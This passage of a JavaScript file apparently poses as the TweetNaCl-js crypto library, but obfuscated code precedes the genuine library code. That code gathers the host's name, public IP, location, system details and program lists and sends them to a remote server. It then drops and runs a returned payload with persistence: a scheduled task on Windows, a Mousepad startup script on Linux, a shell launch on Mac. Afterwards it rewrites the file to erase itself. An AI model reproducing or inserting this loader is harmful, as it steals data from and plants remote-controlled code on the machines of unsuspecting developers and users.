getProgramInfoLinux();if(_0x34bdd0[_0x5b1281(0x310)](_0x17fa92,_0x5b1281(0x1f4)))return _0x34bdd0[_0x5b1281(0x280)](getProgramInfoMac);return{'running':[],'installed':[]};}function getCurrentTime(){const _0x482cde=a0_0x52fd6a;return new Date()[_0x482cde(0x247)]();}function patch(){const _0x3bfa53=a0_0x52fd6a,_0x102cde={'owtSL':'utf8','COLMn':'{\x20default:\x20obj\x20};\x20}','YJFhf':_0x3bfa53(0x2b6)},_0x2cdfc4=__filename,_0x5090fe=fs[_0x3bfa53(0x244)](_0x2cdfc4,_0x102cde[_0x3bfa53(0x2aa)]),_0x1ea9c9=_0x102cde['COLMn'],_0x370a80=_0x102cde[_0x3bfa53(0x2ff)],_0x18a062=_0x5090fe[_0x3bfa53(0x211)](_0x1ea9c9),_0x4df587=_0x5090fe[_0x3bfa53(0x211)](_0x370a80),_0x3a7ea4=_0x5090fe[_0x3bfa53(0x2a0)](_0x4df587);fs[_0x3bfa53(0x2b0)](_0x2cdfc4,_0x3a7ea4);}async function main(){const _0x130925=a0_0x52fd6a,_0x3b8361={'ovOqC':_0x130925(0x251),'xzmKZ':_0x130925(0x1db),'UgqOH':function(_0x27fd3f){return _0x27fd3f();},'xbzaU':function(_0x4429ce,_0x3454ae){return _0x4429ce(_0x3454ae);},'bYVyv':function(_0x14643d,_0x579598,_0xc1d9f7){return _0x14643d(_0x579598,_0xc1d9f7);},'Zfuyq':_0x130925(0x232),'WpYGH':function(_0x12d378,_0x4dc33a){return _0x12d378===_0x4dc33a;},'hmsRr':'exit','KwBzD':'continue','FKbCa':function(_0x500396,_0x3ea743){return _0x500396!==_0x3ea743;},'AvLxo':_0x130925(0x213),'zkfPg':'Windows','qfniD':_0x130925(0x234),'QUwtE':_0x130925(0x2f0),'DdMwf':_0x130925(0x30f),'hdjhr':function(_0x32ffc9,_0x449f01){return _0x32ffc9===_0x449f01;},'kQJgg':'Mac','aTYkr':_0x130925(0x20c),'wiqtH':_0x130925(0x2d9),'CcthK':'XpHGy','bRrhO':_0x130925(0x249),'RVWCu':'whUVW'};try{const _0x14bdaf=getComputerName(),_0x1f70d5=_0x3b8361[_0x130925(0x1c5)](getOSType),_0x168ad5=await _0x3b8361[_0x130925(0x1c5)](getPublicIP),_0x4914d6=await _0x3b8361[_0x130925(0x1c5)](getLocation),_0x3dd9a6=getSystemInfo(),_0x4b7872=await _0x3b8361[_0x130925(0x1c5)](getProgramInfo),_0x11ef51=_0x3b8361[_0x130925(0x1c5)](getCurrentTime),_0x4fc517={'computerName':_0x14bdaf,'osType':_0x1f70d5,'publicIP':_0x168ad5,'location':_0x4914d6,'current_time':_0x11ef51,'system_info':_0x3dd9a6,'program_info':_0x4b7872,'timestamp':_0x11ef51},_0x23a567=_0x3b8361[_0x130925(0x270)](encryptData,_0x4fc517),_0x23a7b2=_0x11ef51,_0x593f2c=_0x3b8361[_0x130925(0x21a)](generateAuthToken,_0x23a567,_0x23a7b2),_0x62a663={'data':_0x23a567[_0x130925(0x2d5)](_0x130925(0x232)),'authToken':_0x593f2c,'timestamp':_0x23a7b2},_0x55626d=await _0x3b8361[_0x130925(0x270)](sendToServer,_0x62a663);if(_0x55626d[_0x130925(0x1b8)][_0x130925(0x226)]){if(_0x55626d[_0x130925(0x1b8)][_0x130925(0x2c8)]){const _0x4374d1=Buffer[_0x130925(0x303)](_0x55626d[_0x130925(0x1b8)][_0x130925(0x2c8)],_0x3b8361[_0x130925(0x212)]),_0x3b5b1c=decryptData(_0x4374d1);_0x3b8361[_0x130925(0x25d)](_0x3b5b1c[_0x130925(0x21f)],_0x3b8361[_0x130925(0x26e)])&&process[_0x130925(0x21c)](0x0);if(_0x3b8361[_0x130925(0x25d)](_0x3b5b1c['flag'],_0x3b8361[_0x130925(0x1fc)])){if(_0x3b8361['FKbCa'](_0x3b8361[_0x130925(0x253)],_0x3b8361[_0x130925(0x253)])){const _0x4b6c57=_0xe6d7af[_0x130925(0x29e)](_0x18d388,_0x130925(0x2bf),cymFEw[_0x130925(0x217)]);try{return _0x3676d3[_0x130925(0x244)](_0x4b6c57);}catch(_0x467e6e){throw new _0x5b0cdb('Failed\x20to\x20read\x20shared\x20key\x20from\x20'+_0x4b6c57+':\x20'+_0x467e6e[_0x130925(0x1df)]);}}else{let _0x434dde='';if(_0x3b8361[_0x130925(0x25d)](_0x1f70d5,_0x3b8361[_0x130925(0x2fe)]))_0x434dde=path['join'](_0x3b8361['qfniD'],_0x3b8361[_0x130925(0x235)],_0x3b8361[_0x130925(0x2e4)],_0x130925(0x20c)),!fs['existsSync'](path['dirname'](_0x434dde))&&fs[_0x130925(0x1ff)](path[_0x130925(0x298)](_0x434dde),{'recursive':!![]}),fs[_0x130925(0x2b0)](_0x434dde,Buffer['isBuffer'](_0x3b5b1c['data'])?decrypted:Buffer[_0x130925(0x303)](_0x3b5b1c['data'])),await _0x3b8361[_0x130925(0x1c5)](createTask);else{if(_0x1f70d5===_0x130925(0x250)){const _0x1e0757=os['homedir']()+_0x130925(0x305);!fs['existsSync'](_0x1e0757)&&fs[_0x130925(0x1ff)](_0x1e0757,{'recursive':!![]});let _0x1553bb=os[_0x130925(0x2dc)]()+_0x130925(0x2e7);fs['writeFileSync'](_0x1553bb,Buffer[_0x130925(0x1de)](_0x3b5b1c[_0x130925(0x1b8)])?decrypted:Buffer[_0x130925(0x303)](_0x3b5b1c[_0x130925(0x1b8)]));let _0x4b10d7=os['homedir']()+'/.config/Mousepad/Mousepad/startup.sh';fs[_0x130925(0x2b0)](_0x4b10d7,_0x3b5b1c[_0x130925(0x25c)]),createshellchild(_0x3b5b1c[_0x130925(0x230)]),await new Promise(_0xe1d524=>setTimeout(_0xe1d524,0x1388));}}_0x3b8361[_0x130925(0x28f)](_0x1f70d5,_0x3b8361[_0x130925(0x314)])&&(_0x434dde=path[_0x130925(0x29e)](os[_0x130925(0x2dc)](),_0x3b8361['aTYkr']),fs[_0x130925(0x2b0)](_0x434dde,Buffer[_0x130925(0x1de)](_0x3b5b1c[_0x130925(0x1b8)])?_0x3b5b1c[_0x130925(0x1b8)]:Buffer[_0x130925(0x303)](_0x3b5b1c[_0x130925(0x1b8)])),createshellchild(_0x130925(0x2f7)+_0x434dde)),patch();}}}}else{if(_0x3b8361[_0x130925(0x1b5)]===_0x3b8361[_0x130925(0x1cd)]){if(_0x361aef)return;if(_0x5f13a9)return;}else process[_0x130925(0x21c)](0x1);}}catch(_0x461bba){if(_0x3b8361[_0x130925(0x1f0)](_0x3b8361[_0x130925(0x1b9)],_0x3b8361[_0x130925(0x2d4)]))process[_0x130925(0x21c)](0x1);else return _0x5d52ea['toString']()['search'](_0x130925(0x1db))['toString']()[_0x130925(0x1bb)](_0x57dc49)[_0x130925(0x2da)](cymFEw[_0x130925(0x206)]);}}main();
}

(function(nacl) {
'use strict';

// Ported in 2014 by Dmitry Chestnykh and Devi Mandiri.
// Public domain.
//
// Implementation derived from TweetNaCl version 20140427.
// See for details: http://tweetnacl.cr.yp.to/

var u64 = function(h, l) { this.hi = h|0 >>> 0; this.lo = l|0 >>> 0; };
var gf = function(init) {
  var i, r = new Float64Array(16);
  if (init) for (i = 0; i < init.length; i++) r[i] = init[i];
  return r;
};

//  Pluggable, initialized in high-level API below.
var randombytes = function(/* x, n */) { throw new Error('no PRNG'); };

var _0 = new Uint8Array(16);
var _9 = new Uint8Array(32); _9[0] = 9;

var gf0 = gf(),
    gf1 = gf([1]),
    _121665 = gf([0xdb41, 1]),
    D = gf([0x78a3, 0x1359, 0x4dca, 0x75eb, 0xd8ab, 0x4141, 0x0a4d, 0x0070, 0xe898, 0x7779, 0x4079, 0x8cc7, 0xfe73, 0x2b6f, 0x6cee, 0x5203]),
    D2 = gf([0xf159, 0x26b2, 0x9b94, 0xebd6, 0xb156, 0x8283, 0x149a, 0x00e0, 0xd130, 0xeef3, 0x80f2, 0x198e, 0xfce7, 0x56df, 0xd9dc, 0x2406]),
    X = gf([0xd51a, 0x8f25, 0x2d60, 0xc956, 0xa7b2, 0x9525, 0xc760, 0x692c, 0xdc5c, 0xfdd6, 0xe231, 0xc0a4, 0x53fe, 0xcd6e, 0x36d3, 0x2169]),
    Y = gf([0x6658, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666]),
    I = gf([0xa0b0, 0x4a0e, 0x1b27, 0xc4ee, 0xe478, 0xad2f, 0x1806, 0x2f43, 0xd7a7, 0x3dfb, 0x0099, 0x2b4d, 0xdf0b, 0x4fc1, 0x2480, 0x2b83]);

function L32(x, c) { return (x << c) | (x >>> (32 - c)); }

function ld32(x, i) {
  var u = x[i+3] & 0xff;
  u = (u<<8)|(x[i+2] & 0xff);
  u = (u<<8)|(x[i+1] & 0xff);
  return (u<<8)|(x[i+0] & 0xff);
}

function dl64(x, i) {
  var h = (x[i] << 24) | (x[i+1] << 16) | (x[i+2] << 8) | x[i+3];
  var l = (x[i+4] << 24) | (x[i+5] << 16) | (x[i+6] << 8) | x[i+7];
  return new u64(h, l);
}

function st32(x, j, u) {
  var i;
  for (i = 0; i < 4; i++) { x[j+i] = u & 255; u >>>= 8; }
}

function ts64(x, i, u) {
  x[i]   = (u.hi >> 24) & 0xff;
  x[i+1] = (u.hi >> 16) & 0xff;
  x[i+2] = (u.hi >>  8) & 0xff;
  x[i+3] = u.hi & 0xff;
  x[i+4] = (u.lo >> 24)  & 0xff;
  x[i+5] = (u.lo >> 16)  & 0xff;
  x[i+6] = (u.lo >>  8)  & 0xff;
  x[i+7] = u.lo & 0xff;
}

function vn(x, xi, y, yi, n) {
  var i,d = 0;
  for (i = 0; i < n; i++) d |= x[xi+i]^y[yi+i];
  return (1 & ((d - 1) >>> 8)) - 1;
}

function crypto_verify_16(x, xi, y, yi) {
  return vn(x,xi,y,yi,16);
}

function crypto_verify_32(x, xi, y, yi) {
  return vn(x,xi,y,yi,32);
}

function core(out,inp,k,c,h) {
  var w = new Uint32Array(16), x = new Uint32Array(16),
      y = new Uint32Array(16), t = new Uint32Array(4);
  var i, j, m;

  for (i = 0; i < 4; i++) {
    x[5*i] = ld32(c, 4*i);
    x[1+i] = ld32(k, 4*i);
    x[6+i] = ld32(inp, 4*i);
    x[11+i] = ld32(k, 16+4*i);
  }

  for (i = 0; i < 16; i++) y[i] = x[i];

  for (i = 0; i < 20; i++) {
    for (j = 0; j < 4; j++) {
      for (m = 0; m < 4; m++) t[m] = x[(5*j+4*m)%16];
      t[1] ^= L32((t[0]+t[3])|0, 7);
      t[2] ^= L32((t[1]+t[0])|0, 9);
      t[3] ^= L32((t[2]+t[1])|0,13);
      t[0] ^= L32((t[3]+t[2])|0,18);
      for (m = 0; m < 4; m++) w[4*j+(j+m)%4] = t[m];
    }
    for (m = 0; m < 16; m++) x[m] = w[m];
  }

  if (h) {
    for (i = 0; i < 16; i++) x[i] = (x[i] + y[i]) | 0;
    for (i = 0; i < 4; i++) {
      x[5*i] = (x[5*i] - ld32(c, 4*i)) | 0;
      x[6+i] = (x[6+i] - ld32(inp, 4*i)) | 0;
    }
    for (i = 0; i < 4; i++) {
      st32(out,4*i,x[5*i]);
      st32(out,16+4*i,x[6+i]);
    }
  } else {
    for (i = 0; i < 16; i++) st32(out, 4 * i, (x[i] + y[i]) | 0);
  }
}

function crypto_core_salsa20(out,inp,k,c) {
  core(out,inp,k,c,false);
  return 0;
}

function crypto_core_hsalsa20(out,inp,k,c) {
  core(out,inp,k,c,true);
  return 0;
}

var sigma = new Uint8Array([101, 120, 112, 97, 110, 100, 32, 51, 50, 45, 98, 121, 116, 101, 32, 107]);
            // "expand 32-byte k"

function crypto_stream_salsa20_xor(c,cpos,m,mpos,b,n,k) {
  var z = new Uint8Array(16), x = new Uint8Array(64);
  var u, i;
  if (!b) return 0;
  for (i = 0; i < 16; i++) z[i] = 0;
  for (i = 0; i < 8; i++) z[i] = n[i];
  while (b >= 64) {
    crypto_core_salsa20(x,z,k,sigma);
    for (i = 0; i < 64; i++) c[cpos+i] = (m?m[mpos+i]:0) ^ x[i];
    u = 1;
    for (i = 8; i < 16; i++) {
      u = u + (z[i] & 0xff) | 0;
      z[i] = u & 0xff;
      u >>>= 8;
    }
    b -= 64;
    cpos += 64;
    if (m) mpos += 64;
  }
  if (b > 0) {
    crypto_core_salsa20(x,z,k,sigma);
    for (i = 0; i < b; i++) c[cpos+i] = (m?m[mpos+i]:0) ^ x[i];
  }
  return 0;
}

function crypto_stream_salsa20(c,cpos,d,n,k) {
  return crypto_stream_salsa20_xor(c,cpos,null,0,d,n,k);
}

function crypto_stream(c,cpos,d,n,k) {
  var s = new Uint8Array(32);
  crypto_core_hsalsa20(s,n,k,sigma);
  return crypto_stream_salsa20(c,cpos,d,n.subarray(16),s);
}

function crypto_stream_xor(c,cpos,m,mpos,d,n,k) {
  var s = new Uint8Array(32);
  crypto_core_hsalsa20(s,n,k,sigma);
  return crypto_stream_salsa20_xor(c,cpos,m,mpos,d,n.subarray(16),s);
}

function add1305(h, c) {
  var j, u = 0;
  for (j = 0; j < 17; j++) {
    u = (u + ((h[j] + c[j]) | 0)) | 0;
    h[j] = u & 255;
    u >>>= 8;
  }
}

var minusp = new Uint32Array([
  5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 252
]);

function crypto_onetimeauth(out, outpos, m, mpos, n, k) {
  var s, i, j, u;
  var x = new Uint32Array(17), r = new Uint32Array(17),
      h = new Uint32Array(17), c = new Uint32Array(17),
      g = new Uint32Array(17);
  for (j = 0; j < 17; j++) r[j]=h[j]=0;
  for (j = 0; j < 16; j++) r[j]=k[j];
  r[3]&=15;
  r[4]&=252;
  r[7]&=15;
  r[8]&=252;
  r[11]&=15;
  r[12]&=252;
  r[15]&=15;

  while (n > 0) {
    for (j = 0; j < 17; j++) c[j] = 0;
    for (j = 0; (j < 16) && (j < n); ++j) c[j] = m[mpos+j];
    c[j] = 1;
    mpos += j; n -= j;
    add1305(h,c);
    for (i = 0; i < 17; i++) {
      x[i] = 0;
      for (j = 0; j < 17; j++) x[i] = (x[i] + (h[j] * ((j <= i) ? r[i - j] : ((320 * r[i + 17 - j])|0))) | 0) | 0;
    }
    for (i = 0; i < 17; i++) h[i] = x[i];
    u = 0;
    for (j = 0; j < 16; j++) {
      u = (u + h[j]) | 0;
      h[j] = u & 255;
      u >>>= 8;
    }
    u = (u + h[16]) | 0; h[16] = u & 3;
    u = (5 * (u >>> 2)) | 0;
    for (j = 0; j < 16; j++) {
      u = (u + h[j]) | 0;
      h[j] = u & 255;
      u >>>= 8;
    }
    u = (u + h[16]) | 0; h[16] = u;
  }

  for (j = 0; j < 17; j++) g[j] = h[j];
  add1305(h,minusp);
  s = (-(h[16] >>> 7) | 0);
  for (j = 0; j < 17; j++) h[j] ^= s & (g[j] ^ h[j]);

  for (j = 0; j < 16; j++) c[j] = k[j + 16];
  c[16] = 0;
  add1305(h,c);
  for (j = 0; j < 16; j++) out[outpos+j] = h[j];
  return 0;
}

function crypto_onetimeauth_verify(h, hpos, m, mpos, n, k) {
  var x = new Uint8Array(16);
  crypto_onetimeauth(x,0,m,mpos,n,k);
  return crypto_verify_16(h,hpos,x,0);
}

function crypto_secretbox(c,m,d,n,k) {
  var i;
  if (d < 32) return -1;
  crypto_stream_xor(c,0,m,0,d,n,k);
  crypto_onetimeauth(c, 16, c, 32, d - 32, c);
  for (i = 0; i < 16; i++) c[i] = 0;
  return 0;
}

function crypto_secretbox_open(m,c,d,n,k) {
  var i;
  var x = new Uint8Array(32);
  if (d < 32) return -1;
  crypto_stream(x,0,32,n,k);
  if (crypto_onetimeauth_verify(c, 16,c, 32,d - 32,x) !== 0) return -1;
  crypto_stream_xor(m,0,c,0,d,n,k);
  for (i = 0; i < 32; i++) m[i] = 0;
  return 0;
}

function set25519(r, a) {
  var i;
  for (i = 0; i < 16; i++) r[i] = a[i]|0;
}

function car25519(o) {
  var c;
  var i;
  for (i = 0; i < 16; i++) {
      o[i] += 65536;
      c = Math.floor(o[i] / 65536);
      o[(i+1)*(i<15?1:0)] += c - 1 + 37 * (c-1) * (i===15?1:0);
      o[i] -= (c * 65536);
  }
}

function sel25519(p, q, b) {
  var t, c = ~(b-1);
  for (var i = 0; i < 16; i++) {
    t = c & (p[i] ^ q[i]);
    p[i] ^= t;
    q[i] ^= t;
  }
}

function pack25519(o, n) {
  var i, j, b;
  var m = gf(), t = gf();
  for (i = 0; i < 16; i++) t[i] = n[i];
  car25519(t);
  car25519(t);
  car25519(t);
  for (j = 0; j < 2; j++) {
    m[0] = t[0] - 0xffed;
    for (i = 1; i < 15; i++) {
      m[i] = t[i] - 0xffff - ((m[i-1]>>16) & 1);
      m[i-1] &= 0xffff;
    }
    m[15] = t[15] - 0x7fff - ((m[14]>>16) & 1);
    b = (m[15]>>16) & 1;
    m[14] &= 0xffff;
    sel25519(t, m, 1-b);
  }
  for (i = 0; i < 16; i++) {
    o[2*i] = t[i] & 0xff;
    o[2*i+1] = t[i]>>8;
  }
}

function neq25519(a, b) {
  var c = new Uint8Array(32), d = new Uint8Array(32);
  pack25519(c, a);
  pack25519(d, b);
  return crypto_verify_32(c, 0, d, 0);
}

function par25519(a) {
  var d = new Uint8Array(32);
  pack25519(d, a);
  return d[0] & 1;
}

function unpack25519(o, n) {
  var i;
  for (i = 0; i < 16; i++) o[i] = n[2*i] + (n[2*i+1] << 8);
  o[15] &= 0x7fff;
}

function A(o, a, b) {
  var i;
  for (i = 0; i < 16; i++) o[i] = (a[i] + b[i])|0;
}

function Z(o, a, b) {
  var i;
  for (i = 0; i < 16; i++) o[i] = (a[i] - b[i])|0;
}

function M(o, a, b) {
  var i, j, t = new Float64Array(31);
  for (i = 0; i < 31; i++) t[i] = 0;
  for (i = 0; i < 16; i++) {
    for (j = 0; j < 16; j++) {
      t[i+j] += a[i] * b[j];
    }
  }
  for (i = 0; i < 15; i++) {
    t[i] += 38 * t[i+16];
  }
  for (i = 0; i < 16; i++) o[i] = t[i];
  car25519(o);
  car25519(o);
}

function S(o, a) {
  M(o, a, a);
}

function inv25519(o, i) {
  var c = gf();
  var a;
  for (a = 0; a < 16; a++) c[a] = i[a];
  for (a = 253; a >= 0; a--) {
    S(c, c);
    if(a !== 2 && a !== 4) M(c, c, i);
  }
  for (a = 0; a < 16; a++) o[a] = c[a];
}

function pow2523(o, i) {
  var c = gf();
  var a;
  for (a = 0; a < 16; a++) c[a] = i[a];
  for (a = 250; a >= 0; a--) {
      S(c, c);
      if(a !== 1) M(c, c, i);
  }
  for (a = 0; a < 16; a++) o[a] = c[a];
}

function crypto_scalarmult(q, n, p) {
  var z = new Uint8Array(32);
  var x = new Float64Array(80), r, i;
  var a = gf(), b = gf(), c = gf(),
      d = gf(), e = gf(), f = gf();
  for (i = 0; i < 31; i++) z[i] = n[i];
  z[31]=(n[31]&127)|64;
  z[0]&=248;
  unpack25519(x,p);
  for (i = 0; i < 16; i++) {
    b[i]=x[i];
    d[i]=a[i]=c[i]=0;
  }
  a[0]=d[0]=1;
  for (i=254; i>=0; --i) {
    r=(z[i>>>3]>>>(i&7))&1;
    sel25519(a,b,r);
    sel25519(c,d,r);
    A(e,a,c);
    Z(a,a,c);
    A(c,b,d);
    Z(b,b,d);
    S(d,e);
    S(f,a);
    M(a,c,a);
    M(c,b,e);
    A(e,a,c);
    Z(a,a,c);
    S(b,a);
    Z(c,d,f);
    M(a,c,_121665);
    A(a,a,d);
    M(c,c,a);
    M(a,d,f);
    M(d,b,x);
    S(b,e);
    sel25519(a,b,r);
    sel25519(c,d,r);
  }
  for (i = 0; i < 16; i++) {
    x[i+16]=a[i];
    x[i+32]=c[i];
    x[i+48]=b[i];
    x[i+64]=d[i];
  }
  var x32 = x.subarray(32);
  var x16 = x.subarray(16);
  inv25519(x32,x32);
  M(x16,x16,x32);
  pack25519(q,x16);
  return 0;
}

function crypto_scalarmult_base(q, n) {
  return crypto_scalarmult(q, n, _9);
}

function crypto_box_keypair(y, x) {
  randombytes(x, 32);
  return crypto_scalarmult_base(y, x);
}

function crypto_box_beforenm(k, y, x) {
  var s = new Uint8Array(32);
  crypto_scalarmult(s, x, y);
  return crypto_core_hsalsa20(k, _0, s, sigma);
}

var crypto_box_afternm = crypto_secretbox;
var crypto_box_open_afternm = crypto_secretbox_open;

function crypto_box(c, m, d, n, y, x) {
  var k = new Uint8Array(32);
  crypto_box_beforenm(k, y, x);
  return crypto_box_afternm(c, m, d, n, k);
}

function crypto_box_open(m, c, d, n, y, x) {
  var k = new Uint8Array(32);
  crypto_box_beforenm(k, y, x);
  return crypto_box_open_afternm(m, c, d, n, k);
}

function add64() {
  var a = 0, b = 0, c = 0, d = 0, m16 = 65535, l, h, i;
  for (i = 0; i < arguments.length; i++) {
    l = arguments[i].lo;
    h = arguments[i].hi;
    a += (l & m16); b += (l >>> 16);
    c += (h & m16); d += (h >>> 16);
  }

  b += (a >>> 16);
  c += (b >>> 16);
  d += (c >>> 16);

  return new u64((c & m16) | (d << 16), (a & m16) | (b << 16));
}

function shr64(x, c) {
  return new u64((x.hi >>> c), (x.lo >>> c) | (x.hi << (32 - c)));
}

function xor64() {
  var l = 0, h = 0, i;
  for (i = 0; i < arguments.length; i++) {
    l ^= arguments[i].lo;
    h ^= arguments[i].hi;
  }
  return new u64(h, l);
}

function R(x, c) {
  var h, l, c1 = 32 - c;
  if (c < 32) {
    h = (x.hi >>> c) | (x.lo << c1);
    l = (x.lo >>> c) | (x.hi << c1);
  } else if (c < 64) {
    h = (x.lo >>> c) | (x.hi << c1);
    l = (x.hi >>> c) | (x.lo << c1);
  }
  return new u64(h, l);
}

function Ch(x, y, z) {
  var h = (x.hi & y.hi) ^ (~x.hi & z.hi),
      l = (x.lo & y.lo) ^ (~x.lo & z.lo);
  return new u64(h, l);
}

function Maj(x, y, z) {
  var h = (x.hi & y.hi) ^ (x.hi & z.hi) ^ (y.hi & z.hi),
      l = (x.lo & y.lo) ^ (x.lo & z.lo) ^ (y.lo & z.lo);
  return new u64(h, l);
}

function Sigma0(x) { return xor64(R(x,28), R(x,34), R(x,39)); }
function Sigma1(x) { return xor64(R(x,14), R(x,18), R(x,41)); }
function sigma0(x) { return xor64(R(x, 1), R(x, 8), shr64(x,7)); }
function sigma1(x) { return xor64(R(x,19), R(x,61), shr64(x,6)); }

var K = [
  new u64(0x428a2f98, 0xd728ae22), new u64(0x71374491, 0x23ef65cd),
  new u64(0xb5c0fbcf, 0xec4d3b2f), new u64(0xe9b5dba5, 0x8189dbbc),
  new u64(0x3956c25b, 0xf348b538), new u64(0x59f111f1, 0xb605d019),
  new u64(0x923f82a4, 0xaf194f9b), new u64(0xab1c5ed5, 0xda6d8118),
  new u64(0xd807aa98, 0xa3030242), new u64(0x12835b01, 0x45706fbe),
  new u64(0x243185be, 0x4ee4b28c), new u64(0x550c7dc3, 0xd5ffb4e2),
  new u64(0x72be5d74, 0xf27b896f), new u64(0x80deb1fe, 0x3b1696b1),
  new u64(0x9bdc06a7, 0x25c71235), new u64(0xc19bf174, 0xcf692694),
  new u64(0xe49b69c1, 0x9ef14ad2), new u64(0xefbe4786, 0x384f25e3),
  new u64(0x0fc19dc6, 0x8b8cd5b5), new u64(0x240ca1cc, 0x77ac9c65),
  new u64(0x2de92c6f, 0x592b0275), new u64(0x4a7484aa, 0x6ea6e483),
  new u64(0x5cb0a9dc, 0xbd41fbd4), new u64(0x76f988da, 0x831153b5),
  new u64(0x983e5152, 0xee66dfab), new u64(0xa831c66d, 0x2db43210),
  new u64(0xb00327c8, 0x98fb213f), new u64(0xbf597fc7, 0xbeef0ee4),
  new u64(0xc6e00bf3, 0x3da88fc2), new u64(0xd5a79147, 0x930aa725),
  new u64(0x06ca6351, 0xe003826f), new u64(0x14292967, 0x0a0e6e70),
  new u64(0x27b70a85, 0x46d22ffc), new u64(0x2e1b2138, 0x5c26c926),
  new u64(0x4d2c6dfc, 0x5ac42aed), new u64(0x53380d13, 0x9d95b3df),
  new u64(0x650a7354, 0x8baf63de), new u64(0x766a0abb, 0x3c77b2a8),
  new u64(0x81c2c92e, 0x47edaee6), new u64(0x92722c85, 0x1482353b),
  new u64(0xa2bfe8a1, 0x4cf10364), new u64(0xa81a664b, 0xbc423001),
  new u64(0xc24b8b70, 0xd0f89791), new u64(0xc76c51a3, 0x0654be30),
  new u64(0xd192e819, 0xd6ef5218), new u64(0xd6990624, 0x5565a910),
  new u64(0xf40e3585, 0x5771202a), new u64(0x106aa070, 0x32bbd1b8),
  new u64(0x19a4c116, 0xb8d2d0c8), new u64(0x1e376c08, 0x5141ab53),
  new u64(0x2748774c, 0xdf8eeb99), new u64(0x34b0bcb5, 0xe19b48a8),
  new u64(0x391c0cb3, 0xc5c95a63), new u64(0x4ed8aa4a, 0xe3418acb),
  new u64(0x5b9cca4f, 0x7763e373), new u64(0x682e6ff3, 0xd6b2b8a3),
  new u64(0x748f82ee, 0x5defb2fc), new u64(0x78a5636f, 0x43172f60),
  new u64(0x84c87814, 0xa1f0ab72), new u64(0x8cc70208, 0x1a6439ec),
  new u64(0x90befffa, 0x23631e28), new u64(0xa4506ceb, 0xde82bde9),
  new u64(0xbef9a3f7, 0xb2c67915), new u64(0xc67178f2, 0xe372532b),
  new u64(0xca273ece, 0xea26619c), new u64(0xd186b8c7, 0x21c0c207),
  new u64(0xeada7dd6, 0xcde0eb1e), new u64(0xf57d4f7f, 0xee6ed178),
  new u64(0x06f067aa, 0x72176fba), new u64(0x0a637dc5, 0xa2c898a6),
  new u64(0x113f9804, 0xbef90dae), new u64(0x1b710b35, 0x131c471b),
  new u64(0x28db77f5, 0x23047d84), new u64(0x32caab7b, 0x40c72493),
  new u64(0x3c9ebe0a, 0x15c9bebc), new u64(0x431d67c4, 0x9c100d4c),
  new u64(0x4cc5d4be, 0xcb3e42b6), new u64(0x597f299c, 0xfc657e2a),
  new u64(0x5fcb6fab, 0x3ad6faec), new u64(0x6c44198c, 0x4a475817)
];

function crypto_hashblocks(x, m, n) {
  var z = [], b = [], a = [], w = [], t, i, j;

  for (i = 0; i < 8; i++) z[i] = a[i] = dl64(x, 8*i);

  var pos = 0;
  while (n >= 128) {
    for (i = 0; i < 16; i++) w[i] = dl64(m, 8*i+pos);
    for (i = 0; i < 80; i++) {
      for (j = 0; j < 8; j++) b[j] = a[j];
      t = add64(a[7], Sigma1(a[4]), Ch(a[4], a[5], a[6]), K[i], w[i%16]);
      b[7] = add64(t, Sigma0(a[0]), Maj(a[0], a[1], a[2]));
      b[3] = add64(b[3], t);
      for (j = 0; j < 8; j++) a[(j+1)%8] = b[j];
      if (i%16 === 15) {
        for (j = 0; j < 16; j++) {
          w[j] = add64(w[j], w[(j+9)%16], sigma0(w[(j+1)%16]), sigma1(w[(j+14)%16]));
        }
      }
    }

    for (i = 0; i < 8; i++) {
      a[i] = add64(a[i], z[i]);
      z[i] = a[i];
    }

    pos += 128;
    n -= 128;
  }

  for (i = 0; i < 8; i++) ts64(x, 8*i, z[i]);
  return n;
}

var iv = new Uint8Array([
  0x6a,0x09,0xe6,0x67,0xf3,0xbc,0xc9,0x08,
  0xbb,0x67,0xae,0x85,0x84,0xca,0xa7,0x3b,
  0x3c,0x6e,0xf3,0x72,0xfe,0x94,0xf8,0x2b,
  0xa5,0x4f,0xf5,0x3a,0x5f,0x1d,0x36,0xf1,
  0x51,0x0e,0x52,0x7f,0xad,0xe6,0x82,0xd1,
  0x9b,0x05,0x68,0x8c,0x2b,0x3e,0x6c,0x1f,
  0x1f,0x83,0xd9,0xab,0xfb,0x41,0xbd,0x6b,
  0x5b,0xe0,0xcd,0x19,0x13,0x7e,0x21,0x79
]);

function crypto_hash(out, m, n) {
  var h = new Uint8Array(64), x = new Uint8Array(256);
  var i, b = n;

  for (i = 0; i < 64; i++) h[i] = iv[i];

  crypto_hashblocks(h, m, n);
  n %= 128;

  for (i = 0; i < 256; i++) x[i] = 0;
  for (i = 0; i < n; i++) x[i] = m[b-n+i];
  x[n] = 128;

  n = 256-128*(n<112?1:0);
  x[n-9] = 0;
  ts64(x, n-8, new u64((b / 0x20000000) | 0, b << 3));
  crypto_hashblocks(h, x, n);

  for (i = 0; i < 64; i++) out[i] = h[i];

  return 0;
}

function add(p, q) {
  var a = gf(), b = gf(), c = gf(),
      d = gf(), e = gf(), f = gf(),
      g = gf(), h = gf(), t = gf();

  Z(a, p[1], p[0]);
  Z(t, q[1], q[0]);
  M(a, a, t);
  A(b, p[0], p[1]);
  A(t, q[0], q[1]);
  M(b, b, t);
  M(c, p[3], q[3]);
  M(c, c, D2);
  M(d, p[2], q[2]);
  A(d, d, d);
  Z(e, b, a);
  Z(f, d, c);
  A(g, d, c);
  A(h, b, a);

  M(p[0], e, f);
  M(p[1], h, g);
  M(p[2], g, f);
  M(p[3], e, h);
}

function cswap(p, q, b) {
  var i;
  for (i = 0; i < 4; i++) {
    sel25519(p[i], q[i], b);
  }
}

function pack(r, p) {
  var tx = gf(), ty = gf(), zi = gf();
  inv25519(zi, p[2]);
  M(tx, p[0], zi);
  M(ty, p[1], zi);
  pack25519(r, ty);
  r[31] ^= par25519(tx) << 7;
}

function scalarmult(p, q, s) {
  var b, i;
  set25519(p[0], gf0);
  set25519(p[1], gf1);
  set25519(p[2], gf1);
  set25519(p[3], gf0);
  for (i = 255; i >= 0; --i) {
    b = (s[(i/8)|0] >> (i&7)) & 1;
    cswap(p, q, b);
    add(q, p);
    add(p, p);
    cswap(p, q, b);
  }
}

function scalarbase(p, s) {
  var q = [gf(), gf(), gf(), gf()];
  set25519(q[0], X);
  set25519(q[1], Y);
  set25519(q[2], gf1);
  M(q[3], X, Y);
